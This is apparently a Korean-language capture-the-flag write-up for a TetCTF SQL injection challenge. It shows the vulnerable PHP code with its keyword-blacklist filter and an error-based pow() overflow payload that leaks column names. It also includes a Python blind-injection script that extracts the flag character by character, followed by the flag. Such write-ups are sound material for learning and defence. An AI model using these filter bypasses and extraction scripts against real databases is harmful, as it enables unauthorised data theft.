## mysqlimit [100pts]

```php
<!-- The Author of this challenge is so kind and handsome that he is giving you flag, just need to bypass his god-tier waf and grab it <3 -->

<?php 

include('dbconnect.php');

if(!isset($_GET["id"]))
{
    show_source(__FILE__);
}
else
{
    // filter all what i found on internet.... dunno why ｡ﾟ･（>﹏<）･ﾟ｡
    if (preg_match('/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\<|\>|\=/is' , $_GET['id'])) 
    {
        die('<img src="https://i.imgur.com/C42ET4u.gif" />'); 
    }
    else
    {
        // prevent sql injection
        $id = mysqli_real_escape_string($conn, $_GET["id"]);

        $query = "select * from flag_here_hihi where id=".$id;
        $run_query = mysqli_query($conn,$query);

        if(!$run_query) {
            echo mysqli_error($conn);
        }
        else
        {    
            // I'm kidding, just the name of flag, not flag :(
            echo '<br>';
            $res = $run_query->fetch_array()[1];
            echo $res; 
        }
    }
}

?>
```
일단 preg_match() 함수를 이용해서 수 많은 키워드를 필터링하고 있는 것을 볼 수 있습니다. 그리고 id 값이 1일때, 2일때의 출력값이 다르므로 Blind Based SQL Injection을 이용해 `flag`를 뽑아야겠다 생각이 들었습니다.

하지만 `culumn`이라는 키워드가 필터링이 걸려 있어 `flag`가 들어있는 컬럼을 Blind Based SQL Injection을 이용해서 뽑아올 수 없을 거 같다는 생각이 들었습니다. 왜냐하면 `information_schema.columns`라는 메타 테이블에서 `column_name`을 조회해야 하는데 필터링에 때문에 불가능하기 때문입니다.

![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202021-01-03%20오후%206.51.35.png?raw=true)<br>
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202021-01-03%20오후%206.56.37.png?raw=true)

그러다가 N1 CTF에서 `exp()` 함수를 이용해서 Error Based Blind SQL Injection을 이용한 적이 있어서 위와 같이 MySQL의 `exp()`함수를 이용해서 `Overflow`를 일으켜 에러에 내가 원하는 값(Column Name)을 포함시키는 방식으로 해결하려 했지만 `exp()` 함수를 필터링하고 있었습니다. 아마 이 방법을 못 쓰게 방지한 거 같습니다. 그래서 그냥 새해니 쉴려고 접고, 롤을 했었습니다. 그러다 오늘 아침에 다시 확인을 해보니 `exp()` 함수 대신 `pow()` 함수를 이용해도 잘 되는 것을 확인할 수 있었습니다.

![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202021-01-03%20오후%207.01.29.png?raw=true)

```sql
pow(~(select id from (select * from flag_here_hihi limit 0,1) as id),9999)
```
그래서 위 페이로드를 id 값으로 넘겨주니 에러에 컬럼 이름들이 포함되어 있는 것을 확인할 수 있었고, `t_fl4g_v3lue_su`라는 컬럼이 존재하는 것을 알 수 있었습니다.  이제 해당 컬럼의 값을 Blind Based SQL Injection을 이용해서 뽑아내면 GG

```python
import requests

url = "http://45.77.255.164/?id="
flag_len, flag = 0, ""

def Flag_len():
	global flag_len
	for i in range(100):
		payload = "length(t_fl4g_v3lue_su)in({})".format(i)
		URL = url + payload
		res = requests.get(URL)
		if "handsome_flag" in res.text:
			flag_len = i
			print("[+] Flag Length is {}".format(i))
			break

def Flag():
	global flag
	for i in range(1, flag_len + 1):
		for j in range(35, 126):
			payload = "ascii(right(left(t_fl4g_v3lue_su,{}),1))in({})".format(i, j)
			URL = url + payload
			res = requests.get(URL)
			if "handsome_flag" in res.text:
				flag += chr(j)
				break
	print("Flag is {}".format(flag))

if __name__ == '__main__':
	print("[+] Exploitation ...")
	Flag_len()
	Flag()
```
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202021-01-03%20오후%208.20.53.png?raw=true)

위와 같이 익스플로잇 코드를 작성하고 돌려주니 flag가 잘 나오는 것을 볼 수 있습니다.

```
TetCTF{_W3LlLlLlll_Pl44yYyYyyYY_<3_vina_*100*28904961445554#}
```

---
